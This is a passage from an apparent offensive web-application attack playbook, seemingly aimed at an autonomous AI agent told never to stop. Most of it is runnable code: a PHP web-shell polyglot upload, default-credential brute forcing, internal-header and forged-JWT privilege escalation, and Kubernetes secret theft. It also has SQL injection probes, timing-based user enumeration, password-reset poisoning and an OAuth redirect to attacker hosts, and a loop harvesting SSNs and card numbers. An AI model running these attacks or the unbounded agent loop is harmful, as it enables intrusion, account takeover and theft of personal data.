# Polyglot file (valid JPEG header + PHP payload)
python3 -c "
import sys
# JPEG magic bytes + PHP payload
data = b'\xff\xd8\xff\xe0' + b'<?php system(\$_GET[\"cmd\"]); ?>'
sys.stdout.buffer.write(data)
" > /tmp/polyglot.jpg

curl -sk -X POST "$TARGET/api/upload" \
  -H "Authorization: Bearer TOKEN" \
  -F "file=@/tmp/polyglot.jpg;type=image/jpeg"

# PATTERN 2: Integer overflow where frontend enforces max value
# Frontend slider: max=100, min=1
# Send: -1, 0, 999999999, -9999999, 2147483648, 9223372036854775807
for value in -1 0 -999 9999999 2147483647 2147483648 -2147483649 9999999999; do
  STATUS=$(curl -sk -X POST "$TARGET/api/order" \
    -H "Authorization: Bearer TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"item_id\":1,\"quantity\":$value}" \
    -o /tmp/order_resp.txt -w "%{http_code}")
  echo "[$STATUS] quantity=$value: $(head -c 100 /tmp/order_resp.txt)"
done

# PATTERN 3: Enum field bypass
# Frontend dropdown: ["public","private"] — only these two options
# Backend might accept: "admin", "internal", "system", "god"
for visibility in public private internal admin system hidden restricted debug superadmin global; do
  RESP=$(curl -sk -X POST "$TARGET/api/post/create" \
    -H "Authorization: Bearer TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"title\":\"test\",\"visibility\":\"$visibility\"}")
  echo "visibility=$visibility: $(echo $RESP | head -c 100)"
done

# PATTERN 4: Date/time boundary bypass
# Frontend calendar: only allows future dates
# Backend might accept past dates → retroactive operations
for date in "2000-01-01" "1970-01-01" "2099-12-31" "9999-12-31" "0000-00-00" "2024-02-29"; do
  RESP=$(curl -sk -X POST "$TARGET/api/subscription" \
    -H "Authorization: Bearer TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"expiry_date\":\"$date\"}")
  echo "date=$date: $(echo $RESP | head -c 100)"
done
```

---

## ═══════════════════════════════════════════════
## TECHNIQUE 14 — EXPOSE UNAUTHENTICATED DEFAULTS
## Unhardened Default Configs → Admin Access
## ═══════════════════════════════════════════════

### Deep Default Credential & Config Testing

```bash
TARGET="https://TARGET"

# STEP 1: Technology-specific default admin paths
# Kibana (Elasticsearch dashboard)
curl -sk "$TARGET:5601/" && echo "KIBANA EXPOSED"
curl -sk "$TARGET/kibana/" && echo "KIBANA AT /kibana"
curl -sk "$TARGET:5601/app/kibana" -o /tmp/kibana.html
grep -q "kibana" /tmp/kibana.html && echo "KIBANA CONFIRMED"

# Grafana
curl -sk "$TARGET:3000/" -I | grep -i "grafana"
curl -sk "$TARGET/grafana/" -I
# Default creds: admin/admin — test directly
curl -sk -X POST "$TARGET:3000/login" \
  -H "Content-Type: application/json" \
  -d '{"user":"admin","password":"admin"}'

# Jenkins
curl -sk "$TARGET:8080/" | grep -i jenkins
curl -sk "$TARGET/jenkins/" | grep -i jenkins
# Test unauthenticated Script Console (RCE if open)
curl -sk "$TARGET:8080/script" | grep -i "groovy\|script"

# phpMyAdmin
curl -sk "$TARGET/phpmyadmin/" -I
curl -sk "$TARGET/pma/" -I
curl -sk "$TARGET/db/" -I

# Adminer
curl -sk "$TARGET/adminer.php" -I
curl -sk "$TARGET/adminer/" -I

# Redis exposed (no auth)
redis-cli -h $TARGET -p 6379 ping 2>/dev/null && echo "REDIS UNAUTHENTICATED"

# MongoDB exposed (no auth)
curl -sk "$TARGET:27017/" | grep -i "mongo\|looks like"

# Elasticsearch exposed
curl -sk "$TARGET:9200/" | python3 -m json.tool 2>/dev/null
curl -sk "$TARGET:9200/_cat/indices?v" | head -20  # List all indices
curl -sk "$TARGET:9200/_cat/nodes?v"  # Node info

# STEP 2: Default credentials for common admin panels
declare -A DEFAULT_CREDS=(
  ["admin/admin"]="admin"
  ["admin/password"]="admin"
  ["admin/123456"]="admin"
  ["admin/admin123"]="admin"
  ["root/root"]="admin"
  ["test/test"]="test"
)

for cred_pair in "admin:admin" "admin:password" "admin:123456" "admin:admin123" "root:root" "administrator:administrator"; do
  USER=$(echo $cred_pair | cut -d: -f1)
  PASS=$(echo $cred_pair | cut -d: -f2)
  STATUS=$(curl -sk -X POST "$TARGET/api/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$USER@$(echo $TARGET | sed 's|https\?://||' | sed 's|/.*||')\",\"password\":\"$PASS\"}" \
    -o /tmp/login_resp.txt -w "%{http_code}")
  [ "$STATUS" = "200" ] && echo "[DEFAULT CREDS WORK] $USER:$PASS" && cat /tmp/login_resp.txt
done
```

---

## ═══════════════════════════════════════════════
## TECHNIQUE 15 — RECONSTRUCT HIDDEN API DOCS
## Assemble Unmapped Endpoints From Error Fragment
## ═══════════════════════════════════════════════

### Concept
When an API returns errors, it often leaks valid parameter names, valid endpoint paths, and valid field names. Collect all error messages across the entire target and reconstruct a ghost API spec.

### Error Fragment Collection

```bash
TARGET="https://TARGET"
TOKEN="USER_TOKEN"

echo "" > /tmp/api_fragments.txt

# STEP 1: Send malformed requests to every discovered endpoint
# Collect ALL error messages — they contain valid field names

ENDPOINTS=("/api/user" "/api/order" "/api/payment" "/api/product" "/api/admin")

for endpoint in "${ENDPOINTS[@]}"; do
  # Empty body
  curl -sk -X POST "$TARGET$endpoint" \
    -H "Content-Type: application/json" -d '{}' \
    -H "Authorization: Bearer $TOKEN" >> /tmp/api_fragments.txt 2>&1
  echo "---$endpoint---" >> /tmp/api_fragments.txt

  # Wrong types
  curl -sk -X POST "$TARGET$endpoint" \
    -H "Content-Type: application/json" -d '{"id":"not-a-number","email":12345}' \
    -H "Authorization: Bearer $TOKEN" >> /tmp/api_fragments.txt 2>&1
  echo "" >> /tmp/api_fragments.txt
done

# STEP 2: Extract valid field names from error messages
echo "[VALID FIELDS FOUND IN ERRORS]"
cat /tmp/api_fragments.txt | grep -oE '"[a-zA-Z_]+"\s+is\s+required' | grep -oE '"[a-zA-Z_]+"' | sort -u
cat /tmp/api_fragments.txt | grep -oE 'field\s+["\`]?[a-zA-Z_]+["\`]?' | sort -u
cat /tmp/api_fragments.txt | grep -oE 'parameter.*["\`][a-zA-Z_]+["\`]' | sort -u
cat /tmp/api_fragments.txt | grep -oE '"[a-zA-Z_]+".*must be' | sort -u
cat /tmp/api_fragments.txt | grep -oE 'ValidationError.*["\`][a-zA-Z_.]+["\`]' | sort -u

# STEP 3: GraphQL field suggestions (even with introspection disabled)
curl -sk -X POST "$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user { RANDOMFIELD_XYZ } }"}' \
  | grep -oE '"Did you mean.*"'
# GraphQL returns "Did you mean 'email'?" → reveals valid field names
```

---

## ═══════════════════════════════════════════════
## TECHNIQUE 16 — EXPOSE SHADOW ROUTING
## Intercept Silent Background Traffic
## ═══════════════════════════════════════════════

### Concept
Every modern application has background processes: health checks, metric pushes, feature flag polls, A/B test calls. These routes exist, run constantly, but are never documented. Find them.

### Shadow Route Discovery

```bash
TARGET="https://TARGET"

# STEP 1: Common internal/shadow route patterns
SHADOW_PATHS=(
  "/_health" "/_healthz" "/_health/ready" "/_health/live"
  "/_ready" "/_readiness" "/_liveness"
  "/_status" "/_alive" "/_ping" "/_ok"
  "/__health" "/__status" "/__ping"
  "/healthcheck" "/health-check" "/health/check"
  "/_metrics" "/metrics" "/prometheus" "/metrics/prometheus"
  "/_version" "/_build" "/_info" "/_manifest"
  "/_internal/health" "/_internal/metrics"
  "/__internal/ping" "/__internal/stats"
  "/internal/stats" "/internal/metrics" "/internal/health"
  "/_profiler" "/__profiler" "/profiler"
  "/_debug" "/__debug" "/debug/pprof" "/debug/vars"
  "/_env" "/__env" "/env/vars"
  "/manage" "/management" "/manage/health"
  "/_admin/ping" "/_admin/health"
)

for path in "${SHADOW_PATHS[@]}"; do
  STATUS=$(curl -sk -o /tmp/shadow_resp.txt -w "%{http_code}" "$TARGET$path")
  if [ "$STATUS" = "200" ]; then
    SIZE=$(wc -c < /tmp/shadow_resp.txt)
    echo "[SHADOW ROUTE FOUND][$SIZE bytes] $TARGET$path"
    head -5 /tmp/shadow_resp.txt
  fi
done

# STEP 2: Find feature flag endpoints
# Feature flags are often polled every 30 seconds — the endpoint must exist
FF_PATHS=(
  "/api/features" "/api/feature-flags" "/api/flags"
  "/features" "/flags" "/feature-flags"
  "/api/config/features" "/api/config/flags"
  "/launchdarkly/flags" "/unleash/api/client/features"
  "/api/client/features" "/api/toggles"
)

for path in "${FF_PATHS[@]}"; do
  STATUS=$(curl -sk -o /tmp/ff_resp.txt -w "%{http_code}" "$TARGET$path" -H "Authorization: Bearer TOKEN")
  if [ "$STATUS" = "200" ]; then
    echo "[FEATURE FLAGS EXPOSED] $TARGET$path"
    cat /tmp/ff_resp.txt | python3 -m json.tool 2>/dev/null | head -30
  fi
done
```

---

## ═══════════════════════════════════════════════
## TECHNIQUE 17 — ANALYZE STATE ENTROPY
## Predict Session/Token Generation Patterns
## ═══════════════════════════════════════════════

### Concept
If token generation is weak, predictable, or sequential, you can forge tokens for other users. Collect multiple tokens and analyze the pattern.

### Token Entropy Analysis

```bash
TARGET="https://TARGET"

# STEP 1: Generate multiple tokens and observe patterns
echo "[COLLECTING 10 TOKENS]"
for i in $(seq 1 10); do
  RESP=$(curl -sk -X POST "$TARGET/api/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"your_test@email.com","password":"yourpassword"}')

  TOKEN=$(echo $RESP | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('token',d.get('access_token',d.get('jwt',''))))")
  echo "Token $i: $TOKEN"

  # Also collect password reset tokens
  RESET_RESP=$(curl -sk -X POST "$TARGET/api/auth/reset" \
    -H "Content-Type: application/json" \
    -d '{"email":"your_test@email.com"}')
  echo "Reset token $i: $RESET_RESP"

  sleep 1
done

# STEP 2: Analyze token structure
# Are they JWT? Decode them
python3 -c "
import base64, json
tokens = ['TOKEN1', 'TOKEN2', 'TOKEN3']
for t in tokens:
    parts = t.split('.')
    if len(parts) == 3:
        # JWT — decode header and payload
        header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
        print('Header:', header)
        print('Payload:', payload)
    elif len(t) == 32 and t.isalnum():
        print('MD5-like token — potentially weak')
    elif t.isdigit():
        print('NUMERIC token — sequential, highly predictable')
"

# STEP 3: Check for timestamp-based tokens
# If token contains timestamp: date +%s → hex → search in token
NOW=$(date +%s)
HEX_NOW=$(printf '%x' $NOW)
echo "Current timestamp hex: $HEX_NOW"
# If any token contains this hex → timestamp-based = brute-forceable

# STEP 4: Check for ULID/UUID version 1 (time-based)
# UUID v1 embeds timestamp — can be decoded to creation time
# If reset tokens are UUID v1, they're predictable within a time window
```

---

## ═══════════════════════════════════════════════
## TECHNIQUE 18 — ISOLATE INTERNAL TRUST ZONES
## Bypass Perimeter Controls Via Internal Service Trust
## ═══════════════════════════════════════════════

### Concept
Microservices trust each other completely. If you can make a request LOOK like it came from an internal service, you bypass all auth. Find the headers that signal internal origin.

### Internal Trust Exploitation

```bash
TARGET="https://TARGET"

# STEP 1: Find what internal headers the system uses
# Look at ALL headers on every response for clues
curl -sivk "$TARGET/api/user" 2>&1 | grep -iE "x-service|x-internal|x-from|x-caller|x-source|x-origin|x-gateway|x-routing|x-role"

# STEP 2: Test service-identity headers
INTERNAL_HEADERS=(
  "X-Internal-Auth: true"
  "X-Internal-Auth: 1"
  "X-Service-Auth: service_secret"
  "X-Internal-Request: true"
  "X-Internal: 1"
  "X-From-Service: api-gateway"
  "X-Service-Name: admin-service"
  "X-Caller: internal"
  "X-Source: internal"
  "X-Gateway: internal"
  "X-Role: service"
  "X-Forwarded-From: service"
  "X-Api-Version: internal"
  "X-Internal-Api-Key: default"
  "X-Service-Token: service"
  "Authorization: Service internal-token"
  "X-Service-Role: admin"
  "X-Originating-Service: scheduler"
  "X-Cron-Job: true"
)

PROTECTED_ENDPOINT="/api/internal/users"
for header in "${INTERNAL_HEADERS[@]}"; do
  STATUS=$(curl -sk -o /tmp/trust_resp.txt -w "%{http_code}" "$TARGET$PROTECTED_ENDPOINT" -H "$header")
  if [ "$STATUS" != "403" ] && [ "$STATUS" != "401" ] && [ "$STATUS" != "404" ]; then
    echo "[TRUST BYPASS?][$STATUS] Header: $header"
    cat /tmp/trust_resp.txt | head -3
  fi
done

# STEP 3: If Kubernetes — test service account token forwarding
# Kubernetes services have JWT tokens in /var/run/secrets
# If SSRF found:
curl -sk "http://kubernetes.default.svc/api/v1/namespaces/default/secrets" \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
```

---

## ═══════════════════════════════════════════════
## TECHNIQUE 19 — DISCOVER DORMANT ENDPOINTS
## Legacy & Migration Routes Still Active
## ═══════════════════════════════════════════════

### Migration Seam Discovery

```bash
TARGET="https://TARGET"

# STEP 1: Identify current API version from headers/responses
# Then probe all PREVIOUS versions
CURRENT_VERSION="v3"
OLD_VERSIONS=("v1" "v2" "v0" "beta" "alpha" "legacy" "old" "deprecated" "v1.0" "v2.0")

# New endpoints always have new security. Old endpoints often have NONE.
for ver in "${OLD_VERSIONS[@]}"; do
  for endpoint in "/api/$ver/users" "/api/$ver/admin" "/api/$ver/export" "/api/$ver/report"; do
    STATUS=$(curl -sk -o /tmp/old_resp.txt -w "%{http_code}" "$TARGET$endpoint" \
      -H "Authorization: Bearer TOKEN")
    if [ "$STATUS" = "200" ] || [ "$STATUS" = "403" ]; then
      SIZE=$(wc -c < /tmp/old_resp.txt)
      echo "[$STATUS][$SIZE] $TARGET$endpoint"
    fi
  done
done

# STEP 2: Find routes preserved from framework migration
# PHP → Node.js migrations often leave .php files accessible
for path in /index.php /api.php /admin.php /user.php /login.php /upload.php; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET$path")
  echo "[$STATUS] $TARGET$path"
done

# STEP 3: Wayback Machine dormant endpoint recovery
DOMAIN=$(echo $TARGET | sed 's|https\?://||' | sed 's|/.*||')
echo "[WAYBACK MACHINE — HISTORICAL ENDPOINTS]"
curl -sk "https://web.archive.org/cdx/search/cdx?url=$DOMAIN/api/*&output=text&fl=original&collapse=urlkey&from=20190101&to=20220101" \
  | sort -u | head -50
# Historical endpoints from 2019-2022 often still work in 2025

# STEP 4: Probe mobile API endpoints (often less secured)
for path in /mobile/api /app/api /native/api /ios/api /android/api /mobile/v1 /app/v1; do
  STATUS=$(curl -sk -o /tmp/mob_resp.txt -w "%{http_code}" "$TARGET$path")
  [ "$STATUS" != "404" ] && echo "[$STATUS] $TARGET$path"
done
```

---

## ═══════════════════════════════════════════════
## TECHNIQUE 20 — DETECT SILENT ESCALATION FLAWS
## Implicit Role Inheritance Without Logs
## ═══════════════════════════════════════════════

### Concept
Some systems have hierarchical roles where inheriting a parent role gives you child permissions — but developers forget that role A can inherit role B which has admin access. Test ALL role combinations.

### Role Escalation Matrix Testing

```bash
TARGET="https://TARGET"
USER_TOKEN="NORMAL_USER_TOKEN"

# STEP 1: Map all available roles from JS files / API responses
curl -sk "$TARGET/api/roles" -H "Authorization: Bearer $USER_TOKEN"
curl -sk "$TARGET/api/user/me" -H "Authorization: Bearer $USER_TOKEN" | grep -i "role\|permission\|scope"

# STEP 2: Identify admin-only endpoints from every source
# - Swagger spec
# - JS file analysis
# - Error message analysis
# - Sitemap

ADMIN_ENDPOINTS=(
  "/api/admin/users"
  "/api/admin/config"
  "/api/admin/logs"
  "/api/admin/export"
  "/api/user/all"
  "/api/system/info"
)

# STEP 3: Test each admin endpoint with your user token
echo "[TESTING ADMIN ENDPOINTS WITH USER TOKEN]"
for endpoint in "${ADMIN_ENDPOINTS[@]}"; do
  STATUS=$(curl -sk -o /tmp/priv_resp.txt -w "%{http_code}" "$TARGET$endpoint" \
    -H "Authorization: Bearer $USER_TOKEN")
  echo "[$STATUS] $endpoint"
  [ "$STATUS" = "200" ] && echo "  [PRIVILEGE ESCALATION] Access granted!" && cat /tmp/priv_resp.txt | head -5
done

# STEP 4: Test with manipulated JWT claims (if JWT auth)
# Extract your JWT
# Modify: "role":"user" → "role":"moderator"
# If moderator gets access to something user doesn't → improper authorization
python3 -c "
import base64, json

token = 'YOUR.JWT.TOKEN'
parts = token.split('.')
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
print('Original payload:', payload)

# Try each role
for role in ['admin', 'moderator', 'staff', 'internal', 'superuser', 'service']:
    payload['role'] = role
    new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
    new_token = parts[0] + '.' + new_payload + '.invalid_sig'
    print(f'Test role={role}: Bearer {new_token}')
"
```

---

## ═══════════════════════════════════════════════
## TECHNIQUE 21 — EXPLOIT SCHEMA DESYNCS
## Malformed Data That Slips Past Gateways
## ═══════════════════════════════════════════════

### Gateway vs Worker Desync Attacks

```bash
TARGET="https://TARGET"

# DESYNC 1: Array vs String desync
# Gateway validates: "user_id" must be a string
# Worker processes: takes array[0] if array passed
curl -sk -X POST "$TARGET/api/data/fetch" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{"user_id":["admin_user_id","second_value"]}'

# DESYNC 2: Number vs String coercion
# Gateway: type=number validation passes for 1
# Worker: string comparison "1" == "true" in some languages
curl -sk -X POST "$TARGET/api/feature/toggle" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{"enabled":1}'  # Instead of true/false

# DESYNC 3: Null vs Undefined vs Empty
# Gateway: validates non-null
# Worker: null bypasses condition check
curl -sk -X PUT "$TARGET/api/user/role" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{"role":null}'
# PHP: if ($role) → null is falsy → skips role check, assigns null or default admin

# DESYNC 4: Nested object injection
# Gateway sees flat structure, worker dereferences nested
curl -sk -X POST "$TARGET/api/user/update" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{"profile":{"name":"test","__proto__":{"admin":true}}}'

# DESYNC 5: Unicode normalization desync (NFD vs NFC)
# Same character, different byte representation
# Gateway validates NFC form, worker sees NFD form
curl -sk "$TARGET/api/user/caf%C3%A9" # café in NFC
curl -sk "$TARGET/api/user/cafe%CC%81" # café in NFD (different bytes, same display)
```

---

## ═══════════════════════════════════════════════
## TECHNIQUE 22 — PROFILE LATENCY VARIANCES
## Microsecond Delays Map Database Schema & Query Paths
## ═══════════════════════════════════════════════

### Timing Oracle Extraction

```bash
TARGET="https://TARGET"

# TIMING ORACLE 1: Column existence detection
# If querying an existing column → slightly slower (DB work done)
# If querying non-existing column → faster (error thrown early)

echo "[DB COLUMN ORACLE]"
COLUMNS=("id" "email" "username" "password" "password_hash" "token" "api_key" "secret" "role" "admin" "is_admin" "created_at" "updated_at" "deleted_at" "stripe_customer_id" "ssn" "credit_card" "dob" "phone" "address")

for col in "${COLUMNS[@]}"; do
  # Measure time for sort by each potential column
  TIME=$(curl -sk "$TARGET/api/users?sort=$col&order=asc" \
    -H "Authorization: Bearer TOKEN" \
    -w "%{time_total}" -o /dev/null)
  echo "$col: ${TIME}s"
done | sort -t: -k2 -n
# SLOWER columns are likely valid DB column names

# TIMING ORACLE 2: User existence detection
echo "[USER ENUMERATION VIA TIMING]"
TARGETS=("admin" "administrator" "root" "superuser" "ceo" "test" "dev" "api" "service" "bot" "user" "moderator")
DOMAIN=$(echo $TARGET | sed 's|https\?://||' | sed 's|/.*||' | cut -d. -f2)

for user in "${TARGETS[@]}"; do
  TIME=$(curl -sk -X POST "$TARGET/api/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$user@$DOMAIN.com\",\"password\":\"wrongpass12345\"}" \
    -w "%{time_total}" -o /dev/null)
  echo "$user@$DOMAIN.com: ${TIME}s"
done
# Users taking longer = valid usernames (password hash was computed)
```

---

## ═══════════════════════════════════════════════
## TECHNIQUE 23 — CROSS-CORRELATE ANOMALIES
## Link Unrelated Behaviors to Find Root Architecture Flaws
## ═══════════════════════════════════════════════

### Cross-System Correlation Framework

```bash
TARGET="https://TARGET"

# PATTERN: Error message appears on BOTH /api/search AND /api/user
# → Same backend library handles both
# → Same vulnerability exists in both if found in one

# STEP 1: Find consistent error patterns across all endpoints
echo "[PROBING ALL ENDPOINTS FOR SHARED ERROR PATTERNS]"
ENDPOINTS=("/api/search" "/api/user" "/api/product" "/api/order" "/api/comment" "/api/post")
PAYLOADS=("'" '"' "1==1" "<script>" "{{7*7}}" "{\"a\":\"" "null" "undefined" "NaN" "Infinity")

for endpoint in "${ENDPOINTS[@]}"; do
  for payload in "${PAYLOADS[@]}"; do
    RESP=$(curl -sk "$TARGET$endpoint?q=$payload" -H "Authorization: Bearer TOKEN" 2>&1)
    if echo "$RESP" | grep -qiE "syntax error|mysql|postgresql|mongodb|sqlite|oracle|mssql|unexpected token|parse error|stack trace"; then
      echo "[ERROR CORRELATION] $endpoint with payload: $payload"
      echo "$RESP" | head -3
    fi
  done
done

# STEP 2: If SQLi found on /api/search → test EXACT same payload on ALL endpoints
SQLI_PAYLOAD="' OR '1'='1"
for endpoint in "${ENDPOINTS[@]}"; do
  RESP=$(curl -sk "$TARGET$endpoint?id=$SQLI_PAYLOAD" -H "Authorization: Bearer TOKEN")
  echo "$RESP" | grep -qiE "sql|mysql|syntax|error" && echo "[SQLI CONFIRMED] $endpoint"
done

# STEP 3: If IDOR found with numeric ID → test all similar patterns
# Discovered: /api/user/1234 is vulnerable (IDOR)
# Now test: ALL numeric ID endpoints
for endpoint in /api/order /api/invoice /api/report /api/document /api/ticket /api/message /api/file; do
  for id in 1 2 3 1234 9999; do
    STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET$endpoint/$id" -H "Authorization: Bearer TOKEN")
    [ "$STATUS" = "200" ] && echo "[IDOR CANDIDATE] $TARGET$endpoint/$id"
  done
done
```

---

## ═══════════════════════════════════════════════
## TECHNIQUE 24 — PROBE RATE BOUNDARIES
## Trigger Unhandled Fallback States & Race Conditions
## ═══════════════════════════════════════════════

### Rate Limit Boundary Testing

```bash
TARGET="https://TARGET"

# STEP 1: Find the exact rate limit threshold
echo "[FINDING RATE LIMIT BOUNDARY]"
for i in $(seq 1 200); do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET/api/endpoint" \
    -H "Authorization: Bearer TOKEN")
  echo "Request $i: $STATUS"
  [ "$STATUS" = "429" ] && echo "RATE LIMIT HIT AT REQUEST $i" && break
done

# STEP 2: Test what happens AT the boundary (request n-1 and n+1)
# Sometimes the boundary itself is off-by-one and triggers a different code path

# STEP 3: Probe fallback behavior AFTER rate limit
# After being rate limited, sometimes the NEXT request behaves differently
for i in $(seq 1 5); do
  curl -sk "$TARGET/api/auth/login" -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"wrong"}' > /dev/null
done
# Now try with correct credentials
curl -sk "$TARGET/api/auth/login" -H "Content-Type: application/json" \
  -d '{"email":"admin@target.com","password":"correct"}' | python3 -m json.tool
# Does the rate limit also block the valid login? Or does it bypass to a different handler?

# STEP 4: Test concurrent request race at limit boundary
# Send exactly N-1 requests, then simultaneously send 20 more
for i in $(seq 1 49); do  # limit is 50
  curl -sk -o /dev/null "$TARGET/api/login" \
    -d '{"email":"test@test.com","password":"wrong"}' &
done
wait
# Now race 20 at once at the limit boundary
for i in $(seq 1 20); do
  curl -sk "$TARGET/api/login" \
    -d '{"email":"target@admin.com","password":"correct_pass"}' &
done
wait
```

---

## ═══════════════════════════════════════════════
## TECHNIQUE 25 — MASTER CHAIN CONSTRUCTION
## The Complete High-Impact Chain Framework
## ═══════════════════════════════════════════════

### Chain Construction Decision Tree

```
STEP 1 — INVENTORY (what do you have?)
├── Unauthenticated endpoints? → Check for sensitive data leak
├── Auth tokens? → Analyze structure, test manipulation
├── User IDs visible? → Test IDOR patterns
├── File upload? → Test type bypass, path traversal
├── Email change? → Test without reverification
├── Password reset? → Test for step-skip, predictable tokens
├── Payment flow? → Test race conditions
├── Admin endpoints found? → Test 403 bypass techniques
└── Any API spec found? → Test every endpoint for auth

STEP 2 — CONNECT (what can each finding enable?)
├── Info Leak (user IDs) + IDOR = Data breach
├── IDOR (email change) + Password Reset = ATO
├── Mass Assignment (role) + JWT (weak sig) = Priv Esc
├── SSRF (internal) + Actuator (exposed) = RCE/Secrets
├── Race Condition (payment) + Amount Manipulation = Financial
└── Header Injection (Host) + Password Reset = ATO via poisoned link

STEP 3 — VALIDATE (is the chain real?)
├── Test Step 1 of chain → confirm it works
├── Test Step 2 independently → confirm it works
├── Execute the full chain → confirm combined impact
├── Measure ACTUAL damage (what data? which accounts? how much money?)
└── Document: Full curl sequence, all responses, clear impact statement
```

### High-Impact Chain Templates (Real Examples)

```bash
# CHAIN ALPHA: Password Reset Poisoning → ATO
TARGET="https://TARGET"

# Step 1: Verify password reset uses Host header
curl -sk -X POST "$TARGET/api/auth/reset" \
  -H "Content-Type: application/json" \
  -H "Host: evil.attacker.com" \
  -d '{"email":"victim@company.com"}'
# If victim receives email with "evil.attacker.com" reset link → ATO any account

# CHAIN BETA: Open Redirect + OAuth → Account Takeover
# Step 1: Find open redirect
curl -sk "$TARGET/api/redirect?url=https://evil.com" -v 2>&1 | grep Location
# Step 2: Craft OAuth flow with open redirect as callback
# OAuth callback: https://TARGET/api/redirect?url=https://attacker.com/steal_token
# When victim clicks authorize → token sent to attacker

# CHAIN GAMMA: GraphQL + IDOR + PII = Data Breach
# Step 1: GraphQL introspection reveals "userById(id: Int)" query
# Step 2: No auth check on this query
# Step 3: Enumerate all user IDs
for id in $(seq 1 1000); do
  curl -sk -X POST "$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"{ userById(id: $id) { id email phone ssn creditCard } }\"}" \
    | python3 -m json.tool 2>/dev/null | grep -v "null" | head -10
done
```

---

## ═══════════════════════════════════════════════
## PHASE — INFINITE LEARNING LOOP (NEVER STOP)
## The AI Self-Improvement & Adaptation Engine
## ═══════════════════════════════════════════════

### Continuous Intelligence Gathering Protocol

```
AFTER EVERY FINDING — ASK THESE QUESTIONS:

Q1: What framework/library caused this bug?
    → Search: "[framework] [bug type] CVE 2024 2025"
    → Search: "site:hackerone.com [framework] disclosed"
    → Apply same attack to all other instances of this framework on target

Q2: What developer assumption failed?
    → "Developer assumed X" → Find every place X is assumed
    → Test all endpoints that share the same assumption

Q3: What can I access with what I just found?
    → Token found → What endpoints accept it?
    → Internal IP found → What services are on that subnet?
    → DB credentials found → What data is in the database?

Q4: What would the next developer have made the same mistake on?
    → Find the auth code pattern
    → Search entire codebase (via JS) for the same pattern
    → Test every location where that pattern appears

Q5: Is there a faster/deeper version of this finding?
    → SQLi found → Try to dump all tables
    → SSRF found → Try to reach metadata endpoint
    → IDOR found → Try to access admin objects, not just user objects

KNOWLEDGE ACCUMULATION TRIGGER:
Every time any of these appear in a response → LOG IT IN KNOWLEDGE.md:
  ✓ Internal hostname
  ✓ Internal IP address
  ✓ Software version
  ✓ Error message with file path
  ✓ Stack trace
  ✓ DB query
  ✓ Endpoint not previously known
  ✓ Parameter not previously known
  ✓ Any token / credential / key
  ✓ Any user ID / email / PII
  ✓ Response time anomaly (>2x normal)
  ✓ Different status code than expected
  ✓ Any header not seen before
```

---

## ═══════════════════════════════════════════════
## MASTER KNOWLEDGE.MD TEMPLATE (1000-LINE VERSION)
## Generate This File At Session Start — Never Stop Adding
## ═══════════════════════════════════════════════

```bash
# Run this at the START of every bug bounty session
TARGET="https://TARGET_DOMAIN"
DOMAIN=$(echo $TARGET | sed 's|https\?://||' | sed 's|/.*||')
DATE=$(date '+%Y-%m-%d %H:%M:%S')

cat > KNOWLEDGE.md << 'KNOWLEDGE_EOF'
# ██████████████████████████████████████████
# KNOWLEDGE.md — LIVE INTELLIGENCE FILE
# ██████████████████████████████████████████
# This file GROWS throughout the session.
# Every fact discovered must be logged here.
# The AI reads this before every decision.
# ██████████████████████████████████████████

## SESSION INFO
# Target: TARGET_DOMAIN
# Started: DATE
# Status: ACTIVE — DO NOT STOP UNTIL ALL PATHS EXHAUSTED

---

## [INTEL-001] CONFIRMED TECH STACK
# Fill as discovered — never guess
- [ ] Web Server: (nginx / apache / IIS / caddy / traefik)
- [ ] CDN/WAF: (Cloudflare / Akamai / Fastly / AWS CF)
- [ ] API Gateway: (Kong / AWS APIGW / nginx / custom)
- [ ] Backend Language: (PHP / Node / Python / Java / Ruby / Go)
- [ ] Framework: (Express / Django / Spring / Rails / Laravel)
- [ ] Database: (MySQL / Postgres / MongoDB / Redis / Cassandra)
- [ ] Auth System: (JWT / Session / OAuth2 / API Key)
- [ ] Queue System: (RabbitMQ / Kafka / SQS / Redis)
- [ ] Cache System: (Redis / Memcached / Varnish)
- [ ] Infrastructure: (AWS / GCP / Azure / Kubernetes / Docker)
- [ ] Frontend: (React / Vue / Angular / jQuery)
- [ ] Build Tool: (Webpack / Parcel / Vite / Rollup)

---

## [INTEL-002] ALL ENDPOINTS DISCOVERED
### Status 200 — Confirmed Active
# FORMAT: [METHOD] /path → [what it does] → [auth required?]
- [ ] Add here as you find them

### Status 301/302 — Redirects (follow and probe destination)
- [ ] Add here

### Status 401/403 — Auth Required (bypass candidates)
- [ ] Add here

### Status 500 — Server Errors (intelligence in error messages)
- [ ] Add here

---

## [INTEL-003] JS FILES ANALYZED
# FORMAT: URL → Size → Endpoints Found → Secrets Found → Source Map?
- [ ] Add as analyzed

---

## [INTEL-004] PARAMETERS DISCOVERED
# Parameters found in JS, errors, responses, specs
- [ ] id → type: integer/string/uuid
- [ ] Add more as discovered

---

## [INTEL-005] SECRETS / CREDENTIALS / KEYS FOUND
# FORMAT: Type → Value → Location Found → Impact
- [ ] Add as found

---

## [INTEL-006] INTERNAL INFRASTRUCTURE MAP
